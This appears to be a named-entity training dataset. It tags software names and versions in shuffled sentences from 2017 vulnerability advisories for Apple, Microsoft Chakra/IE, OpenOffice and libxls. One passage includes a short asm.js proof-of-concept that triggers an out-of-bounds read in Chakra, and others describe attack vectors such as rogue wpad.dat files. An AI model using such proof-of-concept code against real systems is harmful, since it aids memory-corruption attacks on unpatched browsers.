the O
same O
time O
. O

IOTimeSyncClockManagerUserClient O
overrides O
the O
IOUserClient O
: O
:clientClose O
method O
but O
it O
treats O
it O
like O
a O
destructor O
. O

Apple O
macOS/iOS O
- O
Multiple O
Kernel O
Use-After-Frees O
due O
to O
Incorrect O
IOKit O
Object O
Lifetime O
Management O
in O
IOTimeSyncClockManagerUserClient O

macOS SN
before SV
10.13.1 SV
is O
affected O
. O

The O
issue O
involves O
the O
Sandbox O
component O
. O

It O
allows O
remote O
attackers O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
via O
a O
crafted O
mach O
binary O
. O

The O
issue O
involves O
the O
CFNetwork O
component O
. O

The O
issue O
involves O
the O
HFS O
component O
. O

The O
issue O
involves O
the O
Open O
Scripting O
Architecture O
component O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
AppleScript O
file O
that O
is O
mishandled O
by O
osadecompile O
. O

The O
issue O
involves O
the O
ATS O
component O
. O

It O
allows O
remote O
attackers O
to O
obtain O
sensitive O
information O
from O
process O
memory O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
font O
. O

The O
issue O
involves O
the O
ImageIO O
component O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
crafted O
image O
file O
. O

The O
issue O
involves O
the O
libarchive O
component O
. O

It O
allows O
remote O
attackers O
to O
execute O
arbitrary O
code O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
crafted O
archive O
file O
. O

The O
issue O
involves O
the O
fsck_msdos O
component O
. O

The O
issue O
involves O
the O
Remote O
Management O
component O
. O

iTunes SN
before SV
12.7.1 SV
on O
Windows O
is O
affected O
. O

Safari SN
before SV
11.0.1 SV
is O
affected O
. O

iCloud SN
before SV
7.1 SV
on O
Windows O
is O
affected O
. O

tvOS SN
before SV
11.1 SV
is O
affected O
. O

iOS SN
before SV
11.1 SV
is O
affected O
. O

The O
vulnerability O
was O
confirmed O
on O
ASan O
build O
of O
WebKit O
nightly O
. O

Source O
: O
is O
a O
use-after-free O
security O
vulnerability O
in O
WebKit O
. O

The O
issue O
involves O
the O
APFS O
component O
. O

watchOS SN
before SV
4.1 SV
is O
affected O
. O

On O
Safari O
on O
Mac O
this O
can O
be O
accomplished O
by O
opening O
the O
inspector O
( O
simply O
opening O
the O
inspector O
enables O
accessibility O
features O
) O
. O

On O
WebKitGTK+ O
( O
and O
possibly O
other O
WebKit O
releases O
) O
accessibility O
features O
are O
enabled O
by O
default O
. O

Note O
that O
accessibility O
features O
need O
to O
be O
enabled O
in O
order O
to O
trigger O
this O
bug O
. O

The O
apetag.c O
file O
in O
MP3Gain SN
1.5.2.r2 SV
has O
a O
vulnerability O
which O
results O
in O
a O
stack O
memory O
corruption O
when O
opening O
a O
crafted O
MP3 O
file O
. O

Kernel O
pool O
memory O
corruption O
in O
one O
of O
drivers O
in O
Kaspersky SN
Embedded SN
Systems SN
Security SN
version O
1.2.0.300 SV
leads O
to O
local O
privilege O
escalation O
. O

Memory O
corruption O
in O
Gemalto SN
HASP SN
SRM SN
, O
Sentinel SN
HASP SN
and SN
Sentinel SN
LDK SN
products O
prior SV
to SV
Sentinel O
LDK O
RTE O
version O
7.55 SV
might O
cause O
remote O
code O
execution O
. O

A O
vulnerability O
in O
Apache SN
OpenOffice SN
Writer SN
DOC SN
file SN
parser SN
before SV
4.1.4 SV
, O
and O
specifically O
in O
ImportOldFormatStyles O
, O
allows O
attackers O
to O
craft O
malicious O
documents O
that O
cause O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
potentially O
resulting O
in O
arbitrary O
code O
execution O
. O

A O
vulnerability O
in O
OpenOffice SN
PPT SN
file SN
parser SN
before SV
4.1.4 SV
, O
and O
specifically O
in O
PPTStyleSheet O
, O
allows O
attackers O
to O
craft O
malicious O
documents O
that O
cause O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
potentially O
resulting O
in O
arbitrary O
code O
execution O
. O

Malformed O
input O
may O
lead O
to O
crashes O
( O
with O
a O
buffer O
overflow O
or O
other O
memory O
corruption O
) O
or O
other O
unspecified O
behaviors O
. O

This O
crosses O
a O
privilege O
boundary O
in O
, O
for O
example O
, O
certain O
web-hosting O
environments O
in O
which O
a O
Control O
Panel O
allows O
an O
unprivileged O
user O
account O
to O
create O
subaccounts O
. O

In O
shadow SN
before SV
4.5 SV
, O
the O
newusers O
tool O
could O
be O
made O
to O
manipulate O
internal O
data O
structures O
in O
ways O
unintended O
by O
the O
authors O
. O

An O
attacker O
can O
send O
a O
malicious O
XLS O
file O
to O
trigger O
this O
vulnerability O
. O

A O
specially O
crafted O
XLS O
file O
with O
a O
formula O
record O
can O
cause O
memory O
corruption O
resulting O
in O
remote O
code O
execution O
. O

An O
exploitable O
out-of-bounds O
vulnerability O
exists O
in O
the O
xls_addCell O
function O
of O
libxls SN
1.4 SV
. O

An O
exploitable O
integer O
overflow O
vulnerability O
exists O
in O
xls_appendSST O
function O
of O
libxls SN
1.4 SV
. O
A O
specially O
crafted O
XLS O
file O
can O
cause O
memory O
corruption O
resulting O
in O
remote O
code O
execution O
. O

A O
specially O
crafted O
.TGA O
file O
can O
cause O
an O
out O
of O
bounds O
write O
resulting O
in O
potential O
code O
execution O
. O

An O
attacker O
can O
send O
a O
specific O
.TGA O
file O
to O
trigger O
this O
vulnerability O
. O

A O
memory O
corruption O
vulnerability O
exists O
in O
the O
.TGA O
parsing O
functionality O
of O
Computerinsel SN
Photoline SN
20.02 SV
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
and O
CVE-2017-11916 O
. O

ChakraCore O
, O
and O
Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
and O
CVE-2017-11930 O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

Microsoft O
Edge O
Chakra O
JIT O
- O
Escape O
Analysis O
Bug O

ChakraCore O
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
ChakraCore O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
Internet O
Explorer O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

ChakraCore O
, O
and O
Internet O
Explorer O
in O
Microsoft O
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
and O
Internet O
Explorer O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

ChakraCore O
and O
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

What O
happens O
when O
the O
variable O
b O
gets O
initialized O
is O
: O
1. O
mCompiler- O
> O
LookupIdentifier O
is O
called O
with O
a O
as O
the O
first O
argument O
. O

So O
it O
returns O
-1 O
which O
leads O
OOB O
read O
. O

PoC O
: O
function O
createModule O
( O
) O
{ O
use O
asm O
; O
const O
a O
= O
1.0 O
; O
function O
f O
( O
) O
{ O
var O
b O
= O
a O
; O
var O
a O
= O
0 O
; O
} O
return O
f O
; O
} O
var O
f O
= O
createModule O
( O
) O
; O
f O
( O
) O
; O

2. O
mFunction- O
> O
GetConstRegister O
fails O
to O
find O
the O
int O
value O
in O
the O
double O
constant O
table O
. O

And O
it O
returns O
the O
local O
variable O
a O
, O
which O
is O
of O
type O
int O
, O
but O
not O
the O
double O
constant O
a O
. O

Here O
a O
snippet O
of O
AsmJSByteCodeGenerator O
: O
:EmitAsmJsFunctionBody O
. O

AsmJsVar O
initSource O
= O
nullptr O
; O
if O
( O
decl- O
> O
sxVar.pnodeInit- O
> O
nop O
knopName O
) O
{ O
AsmJsSymbol O
initSym O
= O
mCompiler- O
> O
LookupIdentifier O
( O
decl- O
> O
sxVar.pnodeInit- O
> O
name O
( O
) O
, O
mFunction O
) O
; O
if O
( O
initSym- O
> O
GetSymbolType O
( O
) O
AsmJsSymbol O
: O
:Variable O
) O
{ O
in O
this O
case O
we O
are O
initializing O
with O
value O
of O
a O
constant O
var O
initSource O
= O
initSym- O
> O
Cast O
< O
AsmJsVar O
if O
( O
initSource O
) O
{ O
if O
( O
var- O
> O
GetType O
( O
) O
.isDouble O
( O
) O
) O
{ O
mWriter.AsmReg2 O
( O
Js O
: O
:OpCodeAsmJs O
: O
:Ld_Db O
, O
var- O
> O
GetLocation O
( O
) O
, O
mFunction- O
> O
GetConstRegister O
< O
double O
> O
( O
initSource- O
> O
GetDoubleInitialiser O
Chakra O
thinks O
the O
PoC O
is O
valid O
asm.js O
code O
. O

Microsoft O
Edge O
Chakra O
- O
asm.js O
Out-of-Bounds O
Read O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

ChakraCore O
and O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

Microsoft O
Edge O
Chakra O
JIT O
- O
BackwardPass O
: O
:RemoveEmptyLoopAfterMemOp O
Does O
not O
Insert O
Branches O

ChakraCore O
and O
Windows SN
10 SV
1709 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
Internet O
Explorer O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11905 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

This O
exception O
may O
be O
expected O
and O
handled O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

This O
works O
because O
wpad.dat O
files O
are O
JavaScript O
files O
interpreted O
with O
jscript.dll O
on O
the O
WPAD O
client O
. O

Note O
that O
, O
in O
this O
case O
, O
an O
attacker O
who O
successfully O
exploited O
the O
vulnerability O
would O
gain O
the O
same O
privileges O
as O
the O
WinHTTP O
Web O
Proxy O
Auto-Discovery O
Service O
. O

This O
issue O
could O
potentially O
be O
exploited O
through O
multiple O
vectors O
: O
- O
An O
attacker O
on O
the O
local O
network O
could O
exploit O
this O
issue O
by O
posing O
as O
a O
WPAD O
( O
Web O
Proxy O
Auto-Discovery O
) O
host O
and O
sending O
a O
malicious O
wpad.dat O
file O
to O
the O
victim O
. O

- O
The O
issue O
can O
also O
be O
exploited O
by O
opening O
a O
malicious O
web O
page O
in O
Internet O
Explorer O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

Internet O
Explorer O
in O
Microsoft O
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
Internet O
Explorer O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

ChakraCore O
, O
and O
Internet O
Explorer O
in O
Microsoft O
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
R2 SV
, O
and O
Internet O
Explorer O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

ChakraCore O
, O
and O
Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
and O
and O
Internet O
Explorer O
adn O
Microsoft O
Edge O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11893 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11890 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

Microsoft O
Edge O
Chakra O
JIT O
- O
Op_MaxInAnArray O
and O
Op_MinInAnArray O
can O
Explicitly O
call O
User-Defined O
JavaScript O
Functions O

Microsoft O
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
Internet O
Explorer O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11886 O
, O
CVE-2017-11889 O
, O
CVE-2017-11893 O
, O
CVE-2017-11894 O
, O
CVE-2017-11895 O
, O
CVE-2017-11901 O
, O
CVE-2017-11903 O
, O
CVE-2017-11905 O
, O
CVE-2017-11907 O
, O
CVE-2017-11908 O
, O
CVE-2017-11909 O
, O
CVE-2017-11910 O
, O
CVE-2017-11911 O
, O
CVE-2017-11912 O
, O
CVE-2017-11913 O
, O
CVE-2017-11914 O
, O
CVE-2017-11916 O
, O
CVE-2017-11918 O
, O
and O
CVE-2017-11930 O
. O

Indeed O
, O
integer O
overflows O
can O
happen O
in O
the O
several O
callers O
of O
RegExpBase O
: O
:EnsureSpace O
. O

This O
is O
going O
to O
be O
the O
case O
for O
example O
when O
running O
IE O
in O
the O
Enhanced O
Protected O
Mode O
. O

The O
one O
being O
triggered O
in O
the O
PoC O
is O
in O
RegExpComp O
: O
:Compile O
, O
when O
it O
attempts O
to O
append O
the O
raw O
input O
string O
to O
the O
buffer O
towards O
the O
end O
of O
the O
compilation O
process O
. O

RegExpBase O
: O
:EnsureSpace O
has O
an O
integer O
overflow O
check O
, O
however O
if O
an O
overflow O
happens O
in O
the O
caller O
( O
a O
caller O
must O
add O
the O
size O
which O
it O
wants O
to O
append O
to O
the O
existing O
content O
size O
) O
and O
desired_size O
